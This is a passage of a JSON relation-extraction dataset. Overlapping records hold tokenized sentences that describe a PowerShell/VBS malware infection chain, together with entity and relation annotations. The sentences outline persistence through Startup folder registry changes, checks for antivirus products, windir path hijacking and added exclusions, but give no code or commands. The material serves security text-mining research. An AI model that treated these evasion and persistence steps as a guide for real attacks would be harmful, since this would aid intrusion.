",", "beginning", "by", "modifying", "the", "registry", "values", "to", "change", "the", "current", "user", "'s", "Startup", "folders", "to", "match", "those", "outlined", "in", "the", "script", "."], ["Once", "complete", ",", "a", "custom", "VBS", "file", "(", "Stage", "#", "2A", ")", "is", "created", "in", "the", "modified", "Startup", "directory", ",", "allowing", "for", "the", "execution", "of", "a", "downloaded", "PowerShell", "script", "(", "Stage", "#", "3", ":", "e.g.", ",", "``", "msi.ps1", "''", ")", "during", "subsequent", "reboots", "."], ["The", "script", "continues", "by", "checking", "for", "the", "presence", "of", "specific", "antivirus", "products", "on", "the", "endpoint", ".", "Based", "on", "the", "antivirus", "product", ",", "the", "script", "downloads", "and", "executes", "a", "specific", "version", "of", "the", "PS1", "file", "specified", "in", "the", "previous", "step", "(", "Step", "2", "and", "Stage", "3", ",", "e.g.", ",", "``", "msi.ps1", "''", ")", ",", "subsequently", "running", "the", "VB", "script", "created", "in", "Stage", "2A", "."], ["If", "there", "are", "no", "antivirus", "products", "detected", "on", "the", "endpoint", ",", "the", "script", "generates", "four", "configuration", "scripts", "on", "the", "endpoint", "."], ["Script", "1", "modifies", "the", "``", "windir", "''", "path", ",", "allowing", "the", "script", "to", "execute", "itself", "when", "a", "user", "or", "application", "accesses", "the", "``", "windir", "''", "environment", "variable", ",", "while", "also", "running", "Script", "3", "in", "the", "event", "that", "the", "current", "user", "has", "administrator", "credentials", "."], ["Script", "2", "creates", "exclusions", "for", "specific", "paths", "and", "executables", ",", "deploying", "a", ".NET", "framework", "in", "the", "process", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [2, 2], "name": "VB code", "pos": [2, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [23, 23], "name": "PowerShell script", "pos": [7, 9], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [42, 42], "name": "script", "pos": [1, 2], "index": "2_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [55, 55], "name": "registry values", "pos": [14, 16], "index": "3_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [63, 63], "name": "Startup folders", "pos": [22, 24], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [78, 78], "name": "VBS file", "pos": [5, 7], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [100, 100], "name": "PowerShell script ( Stage", "pos": [27, 31], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [110, 110], "name": "msi.ps1", "pos": [37, 38], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [118, 118], "name": "script", "pos": [1, 2], "index": "8_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [131, 131], "name": "endpoint", "pos": [14, 15], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [140, 140], "name": "script", "pos": [23, 24], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [149, 149], "name": "PS1 file", "pos": [32, 34], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [166, 166], "name": "msi.ps1", "pos": [49, 50], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [173, 173], "name": "VB script", "pos": [56, 58], "index": "13_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [189, 189], "name": "endpoint", "pos": [9, 10], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [192, 192], "name": "script", "pos": [12, 13], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [195, 195], "name": "configuration scripts", "pos": [15, 17], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [201, 201], "name": "Script", "pos": [0, 1], "index": "17_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [206, 206], "name": "windir", "pos": [5, 6], "index": "18_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [224, 224], "name": "windir", "pos": [23, 24], "index": "19_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [245, 245], "name": "Script", "pos": [0, 1], "index": "20_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [248, 248], "name": "exclusions", "pos": [3, 4], "index": "21_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [253, 253], "name": "executables", "pos": [8, 9], "index": "22_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "RD", "evidence": [1, 2], "h": 1, "t": 3}, {"r": "WR", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "RD", "evidence": [1, 2], "h": 1, "t": 4}, {"r": "CO", "evidence": [1, 2], "h": 1, "t": 2}, {"r": "WR", "evidence": [2], "h": 2, "t": 3}, {"r": "WR", "evidence": [2], "h": 2, "t": 4}, {"r": "WR", "evidence": [2, 3], "h": 2, "t": 5}, {"r": "EX", "evidence": [2, 3], "h": 2, "t": 6}, {"r": "WR", "evidence": [2, 3], "h": 2, "t": 7}, {"r": "WR", "evidence": [3, 4], "t": 7, "h": 8}, {"r": "ST", "evidence": [4], "h": 8, "t": 9}, {"r": "RF", "evidence": [4], "h": 8, "t": 9}, {"r": "WR", "evidence": [4], "h": 10, "t": 11}, {"r": "WR", "evidence": [4], "h": 10, "t": 12}, {"r": "EX", "evidence": [4], "h": 10, "t": 13}, {"r": "RD", "evidence": [4, 5, 6], "h": 8, "t": 18}, {"r": "WR", "evidence": [4, 5, 6], "h": 10, "t": 18}, {"r": "CO", "evidence": [4], "h": 8, "t": 10}, {"r": "CO", "evidence": [4, 5], "h": 9, "t": 14}, {"r": "ST", "evidence": [5], "t": 14, "h": 15}, {"r": "RF", "evidence": [5], "t": 14, "h": 15}, {"r": "WR", "evidence": [5], "h": 15, "t": 16}, {"r": "WR", "evidence": [5, 6], "h": 15, "t": 17}, {"r": "RD", "evidence": [5, 6], "h": 15, "t": 19}, {"r": "RD", "evidence": [5, 6], "h": 15, "t": 19}, {"r": "WR", "evidence": [5, 6], "h": 15, "t": 19}, {"r": "RD", "evidence": [6, 7], "t": 19, "h": 20}, {"r": "RD", "evidence": [6, 7], "t": 19, "h": 20}, {"r": "WR", "evidence": [6, 7], "t": 19, "h": 20}, {"r": "WR", "evidence": [7], "h": 20, "t": 21}, {"r": "RD", "evidence": [7], "t": 21, "h": 22}]}, {"title": "051-9", "sents": [["When", "Stage", "2", "is", "initiated", ",", "a", "PowerShell", "script", "is", "executed", "on", "the", "endpoint", ",", "serving", "as", "the", "primary", "tool", "in", "the", "infection", "chain", "."], ["The", "script", "carries", "out", "several", "tasks", "on", "the", "endpoint", ",", "beginning", "by", "modifying", "the", "registry", "values", "to", "change", "the", "current", "user", "'s", "Startup", "folders", "to", "match", "those", "outlined", "in", "the", "script", "."], ["Once", "complete", ",", "a", "custom", "VBS", "file", "(", "Stage", "#", "2A", ")", "is", "created", "in", "the", "modified", "Startup", "directory", ",", "allowing", "for", "the", "execution", "of", "a", "downloaded", "PowerShell", "script", "(", "Stage", "#", "3", ":", "e.g.", ",", "``", "msi.ps1", "''", ")", "during", "subsequent", "reboots", "."], ["The", "script", "continues", "by", "checking", "for", "the", "presence", "of", "specific", "antivirus", "products", "on", "the", "endpoint", ".", "Based", "on", "the", "antivirus", "product", ",", "the", "script", "downloads", "and", "executes", "a", "specific", "version", "of", "the", "PS1", "file", "specified", "in", "the", "previous", "step", "(", "Step", "2", "and", "Stage", "3", ",", "e.g.", ",", "``", "msi.ps1", "''", ")", ",", "subsequently", "running", "the", "VB", "script", "created", "in", "Stage", "2A", "."], ["If", "there", "are", "no", "antivirus", "products", "detected", "on", "the", "endpoint", ",", "the", "script", "generates", "four", "configuration", "scripts", "on", "the", "endpoint", "."], ["Script", "1", "modifies", "the", "``", "windir", "''", "path", ",", "allowing", "the", "script", "to", "execute", "itself", "when", "a", "user", "or", "application", "accesses", "the", "``", "windir", "''", "environment", "variable", ",", "while", "also", "running", "Script", "3", "in", "the", "event", "that", "the", "current", "user", "has", "administrator", "credentials", "."], ["Script", "2", "creates", "exclusions", "for", "specific", "paths", "and", "executables", ",", "deploying", "a", ".NET", "framework", "in", "the", "process", "."], ["Script", "3", "runs", "Script", "2", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [7, 7], "name": "PowerShell script", "pos": [7, 9], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [26, 26], "name": "script", "pos": [1, 2], "index": "1_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [39, 39], "name": "registry values", "pos": [14, 16], "index": "2_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [47, 47], "name": "Startup folders", "pos": [22, 24], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [62, 62], "name": "VBS file", "pos": [5, 7], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [84, 84], "name": "PowerShell script ( Stage", "pos": [27, 31], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [94, 94], "name": "msi.ps1", "pos": [37, 38], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [102, 102], "name": "script", "pos": [1, 2], "index": "7_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [115, 115], "name": "endpoint", "pos": [14, 15], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [124, 124], "name": "script", "pos": [23, 24], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [133, 133], "name": "PS1 file", "pos": [32, 34], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [150, 150], "name": "msi.ps1", "pos": [49, 50], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [157, 157], "name": "VB script", "pos": [56, 58], "index": "12_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [173, 173], "name": "endpoint", "pos": [9, 10], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [176, 176], "name": "script", "pos": [12, 13], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [179, 179], "name": "configuration scripts", "pos": [15, 17], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [185, 185], "name": "Script", "pos": [0, 1], "index": "16_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [190, 190], "name": "windir", "pos": [5, 6], "index": "17_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [208, 208], "name": "windir", "pos": [23, 24], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [229, 229], "name": "Script", "pos": [0, 1], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [232, 232], "name": "exclusions", "pos": [3, 4], "index": "20_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [237, 237], "name": "executables", "pos": [8, 9], "index": "21_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [247, 247], "name": "Script 3", "pos": [0, 2], "index": "22_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [250, 250], "name": "Script 2", "pos": [3, 5], "index": "23_0"}]], "labels": [{"r": "RD", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "RD", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "WR", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1], "h": 1, "t": 3}, {"r": "WR", "evidence": [1, 2], "h": 1, "t": 4}, {"r": "EX", "evidence": [1, 2], "h": 1, "t": 5}, {"r": "WR", "evidence": [1, 2], "h": 1, "t": 6}, {"r": "WR", "evidence": [2, 3], "t": 6, "h": 7}, {"r": "ST", "evidence": [3], "h": 7, "t": 8}, {"r": "RF", "evidence": [3], "h": 7, "t": 8}, {"r": "WR", "evidence": [3], "h": 9, "t": 10}, {"r": "WR", "evidence": [3], "h": 9, "t": 11}, {"r": "EX", "evidence": [3], "h": 9, "t": 12}, {"r": "RD", "evidence": [3, 4, 5], "h": 7, "t": 17}, {"r": "WR", "evidence": [3, 4, 5], "h": 9, "t": 17}, {"r": "CO", "evidence": [3], "h": 7, "t": 9}, {"r": "CO", "evidence": [3, 4], "h": 8, "t": 13}, {"r": "ST", "evidence": [4], "t": 13, "h": 14}, {"r": "RF", "evidence": [4], "t": 13, "h": 14}, {"r": "WR", "evidence": [4], "h": 14, "t": 15}, {"r": "WR", "evidence": [4, 5], "h": 14, "t": 16}, {"r": "RD", "evidence": [4, 5], "h": 14, "t": 18}, {"r": "RD", "evidence": [4, 5], "h": 14, "t": 18}, {"r": "WR", "evidence": [4, 5], "h": 14, "t": 18}, {"r": "RD", "evidence": [5, 6], "t": 18, "h": 19}, {"r": "RD", "evidence": [5, 6], "t": 18, "h": 19}, {"r": "WR", "evidence": [5, 6], "t": 18, "h": 19}, {"r": "WR", "evidence": [6], "h": 19, "t": 20}, {"r": "RD", "evidence": [6], "t": 20, "h": 21}, {"r": "EX", "evidence": [7], "h": 22, "t": 23}]}, {"title": "051-10", "sents": [["The", "script", "carries", "out", "several", "tasks", "on", "the", "endpoint", ",", "beginning", "by", "modifying", "the", "registry", "values", "to", "change", "the", "current", "user", "'s", "Startup", "folders", "to", "match", "those", "outlined", "in", "the", "script", "."], ["Once", "complete", ",", "a", "custom", "VBS", "file", "(", "Stage", "#", "2A", ")", "is", "created", "in", "the", "modified", "Startup", "directory", ",", "allowing", "for", "the", "execution", "of", "a", "downloaded", "PowerShell", "script", "(", "Stage", "#", "3", ":", "e.g.", ",", "``", "msi.ps1", "''", ")", "during", "subsequent", "reboots", "."], ["The", "script", "continues", "by", "checking", "for", "the", "presence", "of", "specific", "antivirus", "products", "on", "the", "endpoint", ".", "Based", "on", "the", "antivirus", "product", ",", "the", "script", "downloads", "and", "executes", "a", "specific", "version", "of", "the", "PS1", "file", "specified", "in", "the", "previous", "step", "(", "Step", "2", "and", "Stage", "3", ",", "e.g.", ",", "``", "msi.ps1", "''", ")", ",", "subsequently", "running", "the", "VB", "script", "created", "in", "Stage", "2A", "."], ["If", "there", "are", "no", "antivirus", "products", "detected", "on", "the", "endpoint", ",", "the", "script", "generates", "four", "configuration", "scripts", "on", "the", "endpoint", "."], ["Script", "1", "modifies", "the", "``", "windir", "''", "path", ",", "allowing", "the", "script", "to", "execute", "itself", "when", "a", "user", "or", "application", "accesses", "the", "``", "windir", "''", "environment", "variable", ",", "while", "also", "running", "Script", "3", "in", "the", "event", "that", "the", "current", "user", "has", "administrator", "credentials", "."], ["Script", "2", "creates", "exclusions", "for", "specific", "paths", "and", "executables", ",", "deploying", "a", ".NET", "framework", "in", "the", "process", "."], ["Script", "3", "runs", "Script", "2", "."], ["Script", "4", "runs", "Script", "1", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "script", "pos": [1, 2], "index": "0_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [14, 14], "name": "registry values", "pos": [14, 16], "index": "1_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [22, 22], "name": "Startup folders", "pos": [22, 24], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [37, 37], "name": "VBS file", "pos": [5, 7], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [59, 59], "name": "PowerShell script ( Stage", "pos": [27, 31], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [69, 69], "name": "msi.ps1", "pos": [37, 38], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [77, 77], "name": "script", "pos": [1, 2], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [90, 90], "name": "endpoint", "pos": [14, 15], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [99, 99], "name": "script", "pos": [23, 24], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [108, 108], "name": "PS1 file", "pos": [32, 34], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [125, 125], "name": "msi.ps1", "pos": [49, 50], "index": "10_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [132, 132], "name": "VB script", "pos": [56, 58], "index": "11_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [148, 148], "name": "endpoint", "pos": [9, 10], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [151, 151], "name": "script", "pos": [12, 13], "index": "13_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [154, 154], "name": "configuration scripts", "pos": [15, 17], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [160, 160], "name": "Script", "pos": [0, 1], "index": "15_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [165, 165], "name": "windir", "pos": [5, 6], "index": "16_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [183, 183], "name": "windir", "pos": [23, 24], "index": "17_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [204, 204], "name": "Script", "pos": [0, 1], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [207, 207], "name": "exclusions", "pos": [3, 4], "index": "19_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [212, 212], "name": "executables", "pos": [8, 9], "index": "20_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [222, 222], "name": "Script 3", "pos": [0, 2], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [225, 225], "name": "Script 2", "pos": [3, 5], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [228, 228], "name": "Script 4", "pos": [0, 2], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [231, 231], "name": "Script 1", "pos": [3, 5], "index": "24_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "EX", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 5}, {"r": "WR", "evidence": [1, 2], "t": 5, "h": 6}, {"r": "ST", "evidence": [2], "h": 6, "t": 7}, {"r": "RF", "evidence": [2], "h": 6, "t": 7}, {"r": "WR", "evidence": [2], "h": 8, "t": 9}, {"r": "WR", "evidence": [2], "h": 8, "t": 10}, {"r": "EX", "evidence": [2], "h": 8, "t": 11}, {"r": "RD", "evidence": [2, 3, 4], "h": 6, "t": 16}, {"r": "WR", "evidence": [2, 3, 4], "h": 8, "t": 16}, {"r": "CO", "evidence": [2], "h": 6, "t": 8}, {"r": "CO", "evidence": [2, 3], "h": 7, "t": 12}, {"r": "ST", "evidence": [3], "t": 12, "h": 13}, {"r": "RF", "evidence": [3], "t": 12, "h": 13}, {"r": "WR", "evidence": [3], "h": 13, "t": 14}, {"r": "WR", "evidence": [3, 4], "h": 13, "t": 15}, {"r": "RD", "evidence": [3, 4], "h": 13, "t": 17}, {"r": "RD", "evidence": [3, 4], "h": 13, "t": 17}, {"r": "WR", "evidence": [3, 4], "h": 13, "t": 17}, {"r": "RD", "evidence": [4, 5], "t": 17, "h": 18}, {"r": "RD", "evidence": [4, 5], "t": 17, "h": 18}, {"r": "WR", "evidence": [4, 5], "t": 17, "h": 18}, {"r": "WR", "evidence": [5], "h": 18, "t": 19}, {"r": "RD", "evidence": [5], "t": 19, "h": 20}, {"r": "EX", "evidence": [6], "h": 21, "t": 22}, {"r": "EX", "evidence": [7], "h": 23, "t": 24}]}, {"title": "051-11", "sents": [["Once", "complete", ",", "a", "custom", "VBS", "file", "(", "Stage", "#", "2A", ")", "is", "created", "in", "the", "modified", "Startup", "directory", ",", "allowing", "for", "the", "execution", "of", "a", "downloaded", "PowerShell", "script", "(", "Stage", "#", "3", ":", "e.g.", ",", "``", "msi.ps1", "''", ")", "during", "subsequent", "reboots", "."], ["The", "script", "continues", "by", "checking", "for", "the", "presence", "of", "specific", "antivirus", "products", "on", "the", "endpoint", ".", "Based", "on", "the", "antivirus", "product", ",", "the", "script", "downloads", "and", "executes", "a", "specific", "version", "of", "the", "PS1", "file", "specified", "in", "the", "previous", "step", "(", "Step", "2", "and", "Stage", "3", ",", "e.g.", ",", "``", "msi.ps1", "''", ")", ",", "subsequently", "running", "the", "VB", "script", "created", "in", "Stage", "2A", "."], ["If", "there", "are", "no", "antivirus", "products", "detected", "on", "the", "endpoint", ",", "the", "script", "generates", "four", "configuration", "scripts", "on", "the", "endpoint", "."], ["Script", "1", "modifies", "the", "``", "windir", "''", "path", ",", "allowing", "the", "script", "to", "execute", "itself", "when", "a", "user", "or", "application", "accesses", "the", "``", "windir", "''", "environment", "variable", ",", "while", "also", "running", "Script", "3", "in", "the", "event", "that", "the", "current", "user", "has", "administrator", "credentials", "."], ["Script", "2", "creates", "exclusions", "for", "specific", "paths", "and", "executables", ",", "deploying", "a", ".NET", "framework", "in", "the", "process", "."], ["Script", "3", "runs", "Script", "2", "."], ["Script", "4", "runs", "Script", "1", "."], ["Script", "4", "subsequently", "executes", "on", "the", "endpoint", ",", "and", "once", "the", "configuration", "scripts", "are", "complete", ",", "they", "are", "deleted", "from", "the", "endpoint", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "VBS file", "pos": [5, 7], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [27, 27], "name": "PowerShell script ( Stage", "pos": [27, 31], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [37, 37], "name": "msi.ps1", "pos": [37, 38], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [45, 45], "name": "script", "pos": [1, 2], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [58, 58], "name": "endpoint", "pos": [14, 15], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [67, 67], "name": "script", "pos": [23, 24], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [76, 76], "name": "PS1 file", "pos": [32, 34], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [93, 93], "name": "msi.ps1", "pos": [49, 50], "index": "7_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [100, 100], "name": "VB script", "pos": [56, 58], "index": "8_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [116, 116], "name": "endpoint", "pos": [9, 10], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [119, 119], "name": "script", "pos": [12, 13], "index": "10_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [122, 122], "name": "configuration scripts", "pos": [15, 17], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [128, 128], "name": "Script", "pos": [0, 1], "index": "12_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [133, 133], "name": "windir", "pos": [5, 6], "index": "13_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [151, 151], "name": "windir", "pos": [23, 24], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [172, 172], "name": "Script", "pos": [0, 1], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [175, 175], "name": "exclusions", "pos": [3, 4], "index": "16_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [180, 180], "name": "executables", "pos": [8, 9], "index": "17_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [190, 190], "name": "Script 3", "pos": [0, 2], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [193, 193], "name": "Script 2", "pos": [3, 5], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [196, 196], "name": "Script 4", "pos": [0, 2], "index": "20_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [199, 199], "name": "Script 1", "pos": [3, 5], "index": "21_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 2, "h": 3}, {"r": "ST", "evidence": [1], "h": 3, "t": 4}, {"r": "RF", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [1], "h": 5, "t": 6}, {"r": "WR", "evidence": [1], "h": 5, "t": 7}, {"r": "EX", "evidence": [1], "h": 5, "t": 8}, {"r": "RD", "evidence": [1, 2, 3], "h": 3, "t": 13}, {"r": "WR", "evidence": [1, 2, 3], "h": 5, "t": 13}, {"r": "CO", "evidence": [1], "h": 3, "t": 5}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 9}, {"r": "ST", "evidence": [2], "t": 9, "h": 10}, {"r": "RF", "evidence": [2], "t": 9, "h": 10}, {"r": "WR", "evidence": [2], "h": 10, "t": 11}, {"r": "WR", "evidence": [2, 3], "h": 10, "t": 12}, {"r": "RD", "evidence": [2, 3], "h": 10, "t": 14}, {"r": "RD", "evidence": [2, 3], "h": 10, "t": 14}, {"r": "WR", "evidence": [2, 3], "h": 10, "t": 14}, {"r": "RD", "evidence": [3, 4], "t": 14, "h": 15}, {"r": "RD", "evidence": [3, 4], "t": 14, "h": 15}, {"r": "WR", "evidence": [3, 4], "t": 14, "h": 15}, {"r": "WR", "evidence": [4], "h": 15, "t": 16}, {"r": "RD", "evidence": [4], "t": 16, "h": 17}, {"r": "EX", "evidence": [5], "h": 18, "t": 19}, {"r": "EX", "evidence": [6], "h": 20, "t": 21}]}, {"title": "051-12", "sents": [["The", "script", "continues", "by", "checking", "for", "the", "presence", "of", "specific", "antivirus", "products", "on", "the", "endpoint", ".", "Based", "on", "the", "antivirus", "product", ",", "the", "script", "downloads", "and", "executes", "a", "specific", "version", "of", "the", "PS1", "file", "specified", "in", "the", "previous", "step", "(", "Step", "2", "and", "Stage", "3", ",", "e.g.", ",", "``", "msi.ps1", "''", ")", ",", "subsequently", "running", "the", "VB", "script", "created", "in", "Stage", "2A", "."], ["If", "there", "are", "no", "antivirus", "products", "detected", "on", "the", "endpoint", ",", "the", "script", "generates", "four", "configuration", "scripts", "on", "the", "endpoint", "."], ["Script", "1", "modifies", "the", "``", "windir", "''", "path", ",", "allowing", "the", "script", "to", "execute", "itself", "when", "a", "user", "or", "application", "accesses", "the", "``", "windir", "''", "environment", "variable", ",", "while", "also", "running", "Script", "3", "in", "the", "event", "that", "the", "current", "user", "has", "administrator", "credentials", "."], ["Script", "2", "creates", "exclusions", "for", "specific", "paths", "and", "executables", ",", "deploying", "a", ".NET", "framework", "in", "the", "process", "."], ["Script", "3", "runs", "Script", "2", "."], ["Script", "4", "runs", "Script", "1", "."], ["Script", "4", "subsequently", "executes", "on", "the", "endpoint", ",", "and", "once", "the", "configuration", "scripts", "are", "complete", ",", "they", "are", "deleted", "from", "the", "endpoint", "."], ["Finally", ",", "the", "parent", "PS1", "script", "downloads", "another", "version", "of", "the", "Stage", "4", "script", "and", "executes", "it", "via", "the", "Stage", "2A", "VBS", "script", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "script", "pos": [1, 2], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [14, 14], "name": "endpoint", "pos": [14, 15], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [23, 23], "name": "script", "pos": [23, 24], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [32, 32], "name": "PS1 file", "pos": [32, 34], "index": "3_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [49, 49], "name": "msi.ps1", "pos": [49, 50], "index": "4_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [56, 56], "name": "VB script", "pos": [56, 58], "index": "5_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [72, 72], "name": "endpoint", "pos": [9, 10], "index": "6_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [75, 75], "name": "script", "pos": [12, 13], "index": "7_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [78, 78], "name": "configuration scripts", "pos": [15, 17], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [84, 84], "name": "Script", "pos": [0, 1], "index": "9_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [89, 89], "name": "windir", "pos": [5, 6], "index": "10_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [107, 107], "name": "windir", "pos": [23, 24], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [128, 128], "name": "Script", "pos": [0, 1], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [131, 131], "name": "exclusions", "pos": [3, 4], "index": "13_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [136, 136], "name": "executables", "pos": [8, 9], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [146, 146], "name": "Script 3", "pos": [0, 2], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [149, 149], "name": "Script 2", "pos": [3, 5], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [152, 152], "name": "Script 4", "pos": [0, 2], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [155, 155], "name": "Script 1", "pos": [3, 5], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [185, 185], "name": "PS1 script", "pos": [4, 6], "index": "19_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [192, 192], "name": "Stage 4 script", "pos": [11, 14], "index": "20_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [197, 197], "name": "it", "pos": [16, 17], "index": "21_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [202, 202], "name": "VBS script", "pos": [21, 23], "index": "22_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 0, "t": 1}, {"r": "RF", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 2, "t": 3}, {"r": "WR", "evidence": [0], "h": 2, "t": 4}, {"r": "EX", "evidence": [0], "h": 2, "t": 5}, {"r": "RD", "evidence": [0, 1, 2], "h": 0, "t": 10}, {"r": "WR", "evidence": [0, 1, 2], "h": 2, "t": 10}, {"r": "CO", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 6}, {"r": "ST", "evidence": [1], "t": 